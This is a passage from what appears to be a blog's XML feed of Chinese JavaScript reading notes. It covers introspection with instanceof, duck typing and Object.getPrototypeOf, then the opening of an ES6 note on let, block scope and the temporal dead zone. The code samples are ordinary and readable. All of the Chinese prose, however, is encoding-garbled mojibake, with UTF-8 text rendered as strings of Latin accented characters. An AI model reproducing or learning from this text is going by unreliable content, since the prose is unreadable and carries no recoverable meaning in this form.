è°ƒè¯•æ ˆæ›´éš¾è¿½è¸ª;2. è‡ªæˆ‘å¼•ç”¨(é€’å½’ã€äº‹ä»¶(è§£é™¤)ç»‘å®šï¼Œç­‰ç­‰)æ›´éš¾; 3. ä»£ç (ç¨å¾®)æ›´éš¾ç†è§£ã€‚(å…¶å®æˆ‘è§‰å¾—è¿™3ä¸ªç¼ºç‚¹è¿˜å¥½ï¼Œå½±å“ä¸æ˜¯é‚£ä¹ˆå¤§).ä½†æ˜¯è¿™ç§ç®€æ´è¯­æ³•å¾ˆç‰¹æ®Šï¼Œä¼šç»™å¯¹åº”çš„å‡½æ•°å¯¹è±¡è®¾ç½®ä¸€ä¸ªå†…éƒ¨çš„ name å±æ€§ï¼Œè¿™æ ·ç†è®ºä¸Šå¯ä»¥ç”¨åœ¨è¿½ è¸ªæ ˆä¸­ã€‚æ‰€ä»¥å®é™…ä¸Šå”¯ä¸€çš„å¼Šç«¯å°±åªå‰©ç¬¬2æ¡äº†.ç»ˆæå»ºè®®å°±æ˜¯:å¦‚æœä½ éœ€è¦è‡ªæˆ‘å¼•ç”¨çš„è¯ï¼Œé‚£æœ€å¥½ä½¿ç”¨ä¼ ç»Ÿçš„å…·åå‡½æ•°è¡¨è¾¾å¼æ¥å®šä¹‰å¯¹åº”çš„å‡½æ•°ï¼Œä¸è¦ä½¿ç”¨ç®€æ´æ–¹æ³•ã€‚</li><li><strong>Object. setPrototypeOf(..)</strong>  è¿™ä¸ªæ˜¯ä¹¦ä¸­æ²¡æœ‰æçš„ï¼Œæˆ‘è§‰å¾—æœ‰å¿…è¦è¿›è¡Œè¡¥å……ä¸‹.é¦–å…ˆï¼ŒObject. setPrototypeOf(..)å¯èƒ½ä¼šå¸¦æ¥æ€§èƒ½é—®é¢˜ï¼Œå¦‚æœå…³å¿ƒæ€§èƒ½ï¼Œåˆ™åº”è¯¥ä½¿ç”¨Object.create()æ›¿ä»£.<strong>Object. setPrototypeOf(..)ä¸Object.create()çš„ä¸»è¦åŒºåˆ«</strong>: Object. setPrototypeOf(..)ä¼šç›´æ¥ä¿®æ”¹ç°æœ‰å¯¹è±¡çš„[[prototype]]ï¼ŒObject.create()åˆ™æ˜¯è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡.æ‰€ä»¥ä½ éœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸€ä¸‹ä¸¢å¤±çš„çš„constructorå±æ€§(å¦‚æœä½ éœ€è¦çš„è¯).è€Œä½¿ç”¨setPrototypeOf(..)åˆ™ä¸éœ€è¦.</li></ul><h3 id="6-5-å†…çœ"><a href="#6-5-å†…çœ" class="headerlink" title="6.5 å†…çœ"></a>6.5 å†…çœ</h3><p><strong>åæ§½:</strong> çºµè§‚æ•´æœ¬ä¹¦ï¼Œä½œè€…å…³äºJavaScriptä¸­æ¨¡æ‹Ÿç±»å’Œç»§æ‰¿â€çš„æ‰¹è¯„ï¼Œè¯´å®ƒä»¬å…·æœ‰å¾ˆå¤§è¯¯å¯¼æ€§!æ›´æ˜¯å—¤ä¹‹ä»¥é¼»!å°±å·®çˆ†ç²—å£äº†ï¼ŒJavaScriptå°±åƒä¸€ä¸ªå¼‚æ•™å¾’ï¼Œåº”è¯¥ç»‘åœ¨åå­—æ¶ä¸Šè¢«çƒ§æ­»!ä½†æ˜¯ä»–è¿™æ ·çš„è§‚ç‚¹ï¼Œéƒ½æ˜¯ç«™åœ¨å…¶ä»–è¯­è¨€çš„è§’åº¦æ¥çœ‹å¾…æ—¶ï¼Œäº§ç”Ÿçš„.æˆ‘æƒ³æ›´å¤šçš„è¯»è€…å¯èƒ½æ˜¯åªæ¥è§¦è¿‡JavaScript.é‚£ä¹ˆä»–å…¶å®æ˜¯æ²¡æœ‰è¿™äº›ç–‘æƒ‘çš„!!!ä½ åè€Œç»™ä»–ä»¬è®²è¿™ä¸€å¤§å †å…¶ä»–è¯­è¨€çš„â€æ­£ç¡®â€å«ä¹‰ï¼Œæœ‰æ—¶å€™ä¼šæ—¶å¾—å…¶å!è®©è¯»è€…æ›´åŠ å›°æƒ‘ï¼Œå¦‚æœæ˜¯ç†è§£ä¸é€å½»çš„ï¼Œåè€Œä¼šæ€€ç–‘è‡ªå·±æœ¬æ¥å†™çš„æ˜¯å¯¹çš„ä»£ç !æ‰€ä»¥è¯»è€…åº”è¯¥åšä¸€ä¸ªå¯ä»¥ç†è§£ä½œè€…æ„å›¾ï¼Œå¹¶ä¸”æ‹¥æœ‰è‡ªæˆ‘è§è§£å’Œè§‚ç‚¹ç«‹åœº!</p><p><strong>ä»€ä¹ˆæ˜¯å†…çœ(è‡ªçœ)ï¼Ÿ</strong><br>é¦–å…ˆï¼Œæœ¬èŠ‚éœ€è¦å¼„æ‡‚ä¸€ä¸ªé—®é¢˜ï¼Œä»€ä¹ˆæ˜¯å†…çœï¼Œæˆ–è€…æ˜¯è‡ªçœã€‚ä¹¦ä¸­çš„è§£é‡Šæ˜¯<code>è‡ªçœå°±æ˜¯æ£€æŸ¥å®ä¾‹çš„ç±»å‹ã€‚ç±»å®ä¾‹çš„è‡ªçœä¸»è¦ç›®çš„æ˜¯é€šè¿‡åˆ›å»ºæ–¹å¼æ¥åˆ¤æ–­å¯¹è±¡çš„ç»“æ„å’ŒåŠŸèƒ½ã€‚</code>æˆ‘è¿™é‡Œå†æ›´é€šä¿—åœ°è§£é‡Šä¸‹:å½“æˆ‘ä»¬æ„å»ºå¾—åˆ°ä¸€ä¸ªå®ä¾‹å¯¹è±¡æ—¶ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬æ˜¯ä¸å¤ªæ¸…é™¤å®ƒçš„å±æ€§å’Œæ–¹æ³•çš„.å°¤å…¶æ˜¯ç¬¬ä¸‰æ–¹åº“.æœ‰æ—¶å€™è´¸ç„¶ä½¿ç”¨ä¼šå¯¼è‡´å¾ˆå¤šé”™è¯¯(ä¾‹å¦‚è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨ï¼Œæˆ–è€…æŠ¥é”™ç­‰).è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦é€šè¿‡è‡ªçœ.å…¶å®å°±æ˜¯é€šè¿‡ä¸€ç³»åˆ—æ“ä½œï¼Œæ¥ç¡®è®¤å®ä¾‹æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„é‚£ä¸ªï¼Œå®ä¾‹çš„æ–¹æ³•æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„(å­˜åœ¨ä¸”å¯ç”¨).</p><p><strong>å†…çœçš„æ–¹æ³•:</strong></p><ul><li><strong>1.é€šè¿‡ instanceof è¯­æ³•:</strong></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">Foo.prototype.something = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1 = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="comment">// å‡è®¾æˆ‘ä»¬ä¸çŸ¥é“ä¸Šé¢çš„è¿‡ç¨‹ï¼ŒåªçŸ¥é“å¾—åˆ°å®ä¾‹å¯¹è±¡a1</span></span><br><span class="line"><span class="comment">//æˆ‘ä»¬æƒ³çŸ¥é“a1æ˜¯ä¸æ˜¯æˆ‘æ‰€å¸Œæœ›çš„å‡½æ•°Fooæ‰€æ„å»ºçš„</span></span><br><span class="line"><span class="keyword">if</span> (a1 <span class="keyword">instanceof</span> Foo) &#123; </span><br><span class="line">  a1.something();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾‹å­ä¸­æˆ‘ä»¬æœ‰ä¸€ä¸ªå®ä¾‹å¯¹è±¡a1ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“a1æ˜¯ä¸æ˜¯æˆ‘ä»¬æ‰€å¸Œæœ›çš„å‡½æ•°Fooæ‰€æ„é€ çš„ï¼Œæ­¤æ—¶å°±å¯ä»¥é€šè¿‡<code>instanceof</code>è¿›è¡Œåˆ¤æ–­.        <code>instanceof</code>æ¯”è¾ƒé€‚åˆåˆ¤æ–­å®ä¾‹å¯¹è±¡å’Œæ„é€ å‡½æ•°ä¹‹é—´çš„å…³ç³».<br><strong>ç¼ºé™·:</strong> ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åˆ¤æ–­å‡½æ•°Aæ˜¯ä¸æ˜¯å‡½æ•°Bçš„â€å­ç±»â€æ—¶ï¼Œåˆ™ä¼šç¨å¾®éº»çƒ¦ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦åƒè¿™æ ·<code>A.prototype instanceof B</code>è¿›è¡Œåˆ¤æ–­.å¹¶ä¸”ä¹Ÿä¸èƒ½ç›´æ¥åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦å…³è”.</p><ul><li><strong>2.é€šè¿‡ â€œé¸­å­ç±»å‹â€:</strong> ä¸ºä»€ä¹ˆä¼šå«è¿™ä¸ªåå­—ï¼Ÿçœ‹äº†ä½œè€…çš„è§£é‡Šï¼Œè¿˜æ˜¯ä¸å¤ªèƒ½æ¥å—.ä¸å¤ªç†è§£å¤–å›½äººçš„è„‘å›è·¯.ä½ åœ¨å›½å†…å’Œåˆ«äººè¯´â€é¸­å­ç±»å‹â€ï¼Œä¼°è®¡ä¹Ÿæ˜¯ä¸€è„¸æ‡µé€¼.å…¶å®å¾ˆç®€å•ï¼Œæ‰€è°“çš„â€é¸­å­ç±»å‹â€å…¶å®ä¹Ÿæ˜¯æˆ‘ä»¬å®é™…å·¥ä½œä¸­å¸¸ç”¨çš„:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¦‚æœa1çš„somethingå­˜åœ¨çš„è¯ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è¿›è¡Œè°ƒç”¨</span></span><br><span class="line"><span class="keyword">if</span> ( a1.something) &#123; </span><br><span class="line">  a1.something();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™ç§æ–¹æ³•æ˜¯éå¸¸å¸¸ç”¨çš„ï¼Œæ’é™¤äº†åœ¨ä¸çŸ¥é“å­˜åœ¨æ€§æƒ…å†µä¸‹ï¼Œè´¸ç„¶è°ƒç”¨çš„é£é™©.<br><strong>ç¼ºé™·:</strong> å…³äºä¹¦ä¸­æåˆ°çš„ç¼ºç‚¹ï¼Œå››ä¸ªå­—æ¦‚æ‹¬å°±æ˜¯â€ä»¥åæ¦‚å…¨â€ .ä¹¦ä¸­å…³äºPromiseçš„ä¾‹å­ï¼Œå°±æ˜¯ä»¥åæ¦‚å…¨çš„ä¾‹å­.æ‰€ä»¥æˆ‘ä»¬åœ¨ä½¿ç”¨æ—¶ï¼Œåœ¨ifåˆ¤æ–­a1.somethingå­˜åœ¨æ—¶ï¼Œæ‰ä¼šåœ¨åé¢ä½¿ç”¨somethingæ–¹æ³•.ä¸è¦ç›´æ¥ä½¿ç”¨anotherthingï¼Œè¿™ç§æ²¡ç¡®è®¤è¿‡çš„æ–¹æ³•.</p><ul><li><strong>3.å¦‚æœä½¿ç”¨å¯¹è±¡å…³è”æ—¶:</strong> åˆ™å¯ä»¥æ¯”è¾ƒç®€å•çš„ä½¿ç”¨<code>Object.getPrototypeOf(..)</code>è¿›è¡Œåˆ¤æ–­.ä¾‹å¦‚<code>Object.getPrototypeOf(a)===A</code>å…¶ä¸­aï¼ŒAéƒ½æ˜¯å¯¹è±¡.å¦‚æœä¸ºtrueï¼Œåˆ™è¯´æ˜açš„åŸå‹é“¾ä¸Šå«æœ‰å¯¹è±¡A.</li></ul><h3 id="6-6-å°ç»“"><a href="#6-6-å°ç»“" class="headerlink" title="6.6 å°ç»“"></a>6.6 å°ç»“</h3><ul><li>é™¤äº†ç±»å’Œç»§æ‰¿è®¾è®¡æ¨¡å¼ï¼Œè¡Œä¸ºå§”æ‰˜å…¶å®æ˜¯æ›´å¼ºå¤§ï¼Œæ›´å€¼å¾—æ¨å¹¿çš„æ¨¡å¼(æœ¬è§‚ç‚¹ä»…ä»£è¡¨ä½œè€…çš„è§‚ç‚¹!)</li><li>è¡Œä¸ºå§”æ‰˜è®¤ä¸ºå¯¹è±¡ä¹‹é—´æ˜¯å…„å¼Ÿå…³ç³»ï¼Œäº’ç›¸å§”æ‰˜ï¼Œè€Œä¸æ˜¯çˆ¶ç±»å’Œå­ç±»çš„å…³ç³»ã€‚JavaScript çš„ [[Prototype]] æœºåˆ¶æœ¬è´¨ä¸Šå°±æ˜¯è¡Œä¸ºå§”æ‰˜æœºåˆ¶ã€‚(æˆ‘è§‰å¾—è¿˜æ˜¯çˆ¶å­å¯¹è±¡å…³ç³».æˆ‘çš„è§£è¯´é‡Œä¹Ÿéƒ½æ˜¯çˆ¶å­ç›¸ç§°)</li><li>å½“ä½ åªç”¨å¯¹è±¡æ¥è®¾è®¡ä»£ç æ—¶ï¼Œä¸ä»…å¯ä»¥è®©è¯­æ³•æ›´åŠ ç®€æ´ï¼Œè€Œä¸”å¯ä»¥è®©ä»£ç ç»“æ„æ›´åŠ æ¸…æ™°ã€‚</li><li>å¯¹è±¡å…³è”(å¯¹è±¡ä¹‹å‰äº’ç›¸å…³è”)æ˜¯ä¸€ç§ç¼–ç é£æ ¼ï¼Œå®ƒå€¡å¯¼çš„æ˜¯ç›´æ¥åˆ›å»ºå’Œå…³è”å¯¹è±¡ï¼Œä¸æŠŠå®ƒä»¬æŠ½è±¡æˆç±»ã€‚å¯¹è±¡å…³è”å¯ä»¥ç”¨åŸºäº [[Prototype]] çš„è¡Œä¸ºå§”æ‰˜éå¸¸è‡ªç„¶åœ°å®ç°   </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯é˜…è¯»ã€Šä½ ä¸çŸ¥é“çš„Javascriptã€‹ï¼ˆä¸Šï¼‰çš„ç¬”è®°ï¼Œå¤§éƒ¨åˆ†å†…å®¹å€Ÿé‰´äº†&lt;a href=&quot;https://juejin.cn/post/6</summary>
      
    
    
    
    <category term="é˜…è¯»ç¬”è®°" scheme="http://example.com/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="JavaScript" scheme="http://example.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>ã€é˜…è¯»ç¬”è®°ã€‘â€” â€” ECMAScript6å…¥é—¨</title>
    <link href="http://example.com/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20ECMAScript6%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20ECMAScript6%E5%85%A5%E9%97%A8/</id>
    <published>2021-06-24T21:28:32.000Z</published>
    <updated>2021-07-01T13:11:29.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯é˜…è¯»é˜®ä¸€å³°è€å¸ˆã€ŠECMAScript 6å…¥é—¨ã€‹çš„ç¬”è®°(ä¸»è¦æ˜¯è®°çš„çŸ¥è¯†ç‚¹ï¼Œå¤–åŠ è‡ªå·±çš„ä¸€ç‚¹æ€è€ƒ)ï¼Œæ–¹ä¾¿ä»Šåå­¦ä¹ å¤ä¹ es6ã€‚</p><h1 id="ECMAScript6ç®€ä»‹"><a href="#ECMAScript6ç®€ä»‹" class="headerlink" title="ECMAScript6ç®€ä»‹"></a>ECMAScript6ç®€ä»‹</h1><h2 id="ECMAScript-å’Œ-JavaScript-çš„å…³ç³»"><a href="#ECMAScript-å’Œ-JavaScript-çš„å…³ç³»" class="headerlink" title="ECMAScript å’Œ JavaScript çš„å…³ç³»"></a>ECMAScript å’Œ JavaScript çš„å…³ç³»</h2><p>ECMAScript å’Œ JavaScript çš„å…³ç³»æ˜¯ï¼Œå‰è€…æ˜¯åè€…çš„è§„æ ¼ï¼Œåè€…æ˜¯å‰è€…çš„ä¸€ç§å®ç°ã€‚</p><h2 id="ES6-ä¸-ECMAScript-2015-çš„å…³ç³»"><a href="#ES6-ä¸-ECMAScript-2015-çš„å…³ç³»" class="headerlink" title="ES6 ä¸ ECMAScript 2015 çš„å…³ç³»"></a>ES6 ä¸ ECMAScript 2015 çš„å…³ç³»</h2><p>ES6 çš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬åœ¨ 2015 å¹´ 6 æœˆå‘å¸ƒï¼Œæ­£å¼åç§°æ˜¯ã€ŠECMAScript 2015 æ ‡å‡†ã€‹ï¼ˆç®€ç§° ES2015ï¼‰ã€‚ES6 æ—¢æ˜¯ä¸€ä¸ªå†å²åè¯ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ³›æŒ‡ï¼Œå«ä¹‰æ˜¯ 5.1 ç‰ˆä»¥åçš„ JavaScript çš„ä¸‹ä¸€ä»£æ ‡å‡†ï¼Œæ¶µç›–äº† ES2015ã€ES2016ã€ES2017 ç­‰ç­‰ï¼Œè€Œ ES2015 åˆ™æ˜¯æ­£å¼åç§°ï¼Œç‰¹æŒ‡è¯¥å¹´å‘å¸ƒçš„æ­£å¼ç‰ˆæœ¬çš„è¯­è¨€æ ‡å‡†ã€‚æœ¬ä¹¦ä¸­æåˆ° ES6 çš„åœ°æ–¹ï¼Œä¸€èˆ¬æ˜¯æŒ‡ ES2015 æ ‡å‡†ï¼Œä½†æœ‰æ—¶ä¹Ÿæ˜¯æ³›æŒ‡â€œä¸‹ä¸€ä»£ JavaScript è¯­è¨€â€ã€‚</p><h1 id="let-å’Œ-const-å‘½ä»¤"><a href="#let-å’Œ-const-å‘½ä»¤" class="headerlink" title="let å’Œ const å‘½ä»¤"></a>let å’Œ const å‘½ä»¤</h1><h2 id="1ã€letå‘½ä»¤"><a href="#1ã€letå‘½ä»¤" class="headerlink" title="1ã€letå‘½ä»¤"></a>1ã€letå‘½ä»¤</h2><h3 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a <span class="comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p><code>let</code>å£°æ˜çš„å˜é‡åªåœ¨å®ƒæ‰€åœ¨çš„ä»£ç å—æœ‰æ•ˆã€‚</p><p><code>for</code>å¾ªç¯è¿˜æœ‰ä¸€ä¸ªç‰¹åˆ«ä¹‹å¤„ï¼Œå°±æ˜¯è®¾ç½®å¾ªç¯å˜é‡çš„é‚£éƒ¨åˆ†æ˜¯ä¸€ä¸ªçˆ¶ä½œç”¨åŸŸï¼Œè€Œå¾ªç¯ä½“å†…éƒ¨æ˜¯ä¸€ä¸ªå•ç‹¬çš„å­ä½œç”¨åŸŸã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç æ­£ç¡®è¿è¡Œï¼Œè¾“å‡ºäº† 3 æ¬¡<code>abc</code>ã€‚è¿™è¡¨æ˜å‡½æ•°å†…éƒ¨çš„å˜é‡<code>i</code>ä¸å¾ªç¯å˜é‡<code>i</code>ä¸åœ¨åŒä¸€ä¸ªä½œç”¨åŸŸï¼Œæœ‰å„è‡ªå•ç‹¬çš„ä½œç”¨åŸŸã€‚</p><h3 id="ä¸å­˜åœ¨å˜é‡æå‡"><a href="#ä¸å­˜åœ¨å˜é‡æå‡" class="headerlink" title="ä¸å­˜åœ¨å˜é‡æå‡"></a>ä¸å­˜åœ¨å˜é‡æå‡</h3><p><code>var</code>å‘½ä»¤ä¼šå‘ç”Ÿâ€œå˜é‡æå‡â€ç°è±¡ï¼Œå³å˜é‡å¯ä»¥åœ¨å£°æ˜ä¹‹å‰ä½¿ç”¨ï¼Œå€¼ä¸º<code>undefined</code>ï¼›<code>let</code>å‘½ä»¤æ”¹å˜äº†è¯­æ³•è¡Œä¸ºï¼Œå®ƒæ‰€å£°æ˜çš„å˜é‡ä¸€å®šè¦åœ¨å£°æ˜åä½¿ç”¨ï¼Œå¦åˆ™æŠ¥é”™ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var çš„æƒ…å†µ</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// è¾“å‡ºundefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let çš„æƒ…å†µ</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// æŠ¥é”™ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><h3 id="æš‚æ—¶æ€§æ­»åŒº"><a href="#æš‚æ—¶æ€§æ­»åŒº" class="headerlink" title="æš‚æ—¶æ€§æ­»åŒº"></a>æš‚æ—¶æ€§æ­»åŒº</h3><p>åªè¦å—çº§ä½œç”¨åŸŸå†…å­˜åœ¨<code>let</code>å‘½ä»¤ï¼Œå®ƒæ‰€å£°æ˜çš„å˜é‡å°±â€œç»‘å®šâ€ï¼ˆbindingï¼‰è¿™ä¸ªåŒºåŸŸï¼Œä¸å†å—å¤–éƒ¨çš„å½±å“ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="keyword">let</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç å­˜åœ¨å…¨å±€å˜é‡<code>tmp</code>ï¼Œä½†æ˜¯å—çº§ä½œç”¨åŸŸå†…<code>let</code>åˆå£°æ˜äº†ä¸€ä¸ªå±€éƒ¨å˜é‡<code>tmp</code>ï¼Œå¯¼è‡´<strong>åè€…ç»‘å®šè¿™ä¸ªå—çº§ä½œç”¨åŸŸ</strong>ï¼Œæ‰€ä»¥åœ¨<code>let</code>å£°æ˜å˜é‡å‰ï¼Œå¯¹<code>tmp</code>èµ‹å€¼ä¼šæŠ¥é”™ã€‚</p><p>ES6 æ˜ç¡®è§„å®šï¼Œå¦‚æœåŒºå—ä¸­å­˜åœ¨<code>let</code>å’Œ<code>const</code>å‘½ä»¤ï¼Œè¿™ä¸ªåŒºå—å¯¹è¿™äº›å‘½ä»¤å£°æ˜çš„å˜é‡ï¼Œä»ä¸€å¼€å§‹å°±å½¢æˆäº†å°é—­ä½œç”¨åŸŸã€‚åœ¨å£°æ˜ä¹‹å‰æ— æ³•ä½¿ç”¨è¿™äº›å˜é‡ï¼Œåœ¨è¯­æ³•ä¸Šç§°ä¸ºâ€œæš‚æ—¶æ€§æ­»åŒºâ€ï¼ˆtemporal dead zoneï¼Œç®€ç§° TDZï¼‰ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="comment">// TDZå¼€å§‹</span></span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// ReferenceError</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> tmp; <span class="comment">// TDZç»“æŸ</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">  tmp = <span class="number">123</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€œæš‚æ—¶æ€§æ­»åŒºâ€æ„å‘³ç€<code>typeof</code>ä¸å†æ˜¯ä¸€ä¸ªç™¾åˆ†ä¹‹ç™¾å®‰å…¨çš„æ“ä½œï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> x; <span class="comment">// ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br></pre></td></tr></table></figure><p>ç›¸æ¯”ï¼Œå¦‚æœä¸€ä¸ªå˜é‡æ ¹æœ¬æ²¡æœ‰è¢«å£°æ˜ï¼Œä½¿ç”¨<code>typeof</code>åè€Œä¸ä¼šæŠ¥é”™ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> undeclared_variable <span class="comment">// &quot;undefined&quot;</span></span><br></pre></td></tr></table></figure><p>æœ‰äº›â€œæ­»åŒºâ€æ¯”è¾ƒéšè”½ï¼Œä¸å¤ªå®¹æ˜“å‘ç°ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">x = y, y = <span class="number">2</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// æŠ¥é”™</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç å› ä¸ºå‚æ•°<code>x</code>é»˜è®¤å€¼ç­‰äºå¦ä¸€ä¸ªå‚æ•°<code>y</code>ï¼Œè€Œæ­¤æ—¶<code>y</code>è¿˜æ²¡æœ‰å£°æ˜ï¼Œå±äºâ€œæ­»åŒºâ€ã€‚å¦‚æœ<code>y</code>çš„é»˜è®¤å€¼æ˜¯<code>x</code>ï¼Œå°±ä¸ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ­¤æ—¶<code>x</code>å·²ç»å£°æ˜äº†ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¸æŠ¥é”™</span></span><br><span class="line"><span class="keyword">var</span> x = x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠ¥é”™</span></span><br><span class="line"><span class="keyword">let</span> x = x;</span><br><span class="line"><span class="comment">// ReferenceError: x is not defined</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>let</code>å£°æ˜å˜é‡æ—¶ï¼Œåªè¦å˜é‡åœ¨è¿˜æ²¡æœ‰å£°æ˜å®Œæˆå‰ä½¿ç”¨ï¼Œå°±ä¼šæŠ¥é”™ã€‚ä¸Šé¢ä»£ç åœ¨å˜é‡<code>x</code>çš„å£°æ˜è¯­å¥è¿˜æ²¡æœ‰æ‰§è¡Œå®Œæˆå‰ï¼Œå°±å»å–<code>x</code>çš„å€¼ï¼Œå¯¼è‡´æŠ¥é”™â€x æœªå®šä¹‰â€œã€‚</p><h3 id="ä¸å…è®¸é‡å¤å£°æ˜"><a href="#ä¸å…è®¸é‡å¤å£°æ˜" class="headerlink" title="ä¸å…è®¸é‡å¤å£°æ˜"></a>ä¸å…è®¸é‡å¤å£°æ˜</h3><p>ä¸èƒ½åœ¨å‡½æ•°å†…éƒ¨é‡æ–°å£°æ˜å‚æ•°ã€‚ç¬¬äºŒæ®µä»£ç ä¸æŠ¥é”™æ˜¯å› ä¸ºåœ¨å‡½æ•°å†…éƒ¨åˆå£°æ˜ä¸€ä¸ªå—çº§ä½œç”¨åŸŸã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// æŠ¥é”™</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> arg;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// ä¸æŠ¥é”™</span></span><br></pre></td></tr></table></figure><h2 id="2ã€å—çº§ä½œç”¨åŸŸ"><a href="#2ã€å—çº§ä½œç”¨åŸŸ" class="headerlink" title="2ã€å—çº§ä½œç”¨åŸŸ"></a>2ã€å—çº§ä½œç”¨åŸŸ</h2><h3 id="ä¸ºä»€ä¹ˆéœ€è¦å—çº§ä½œç”¨åŸŸï¼Ÿ"><a 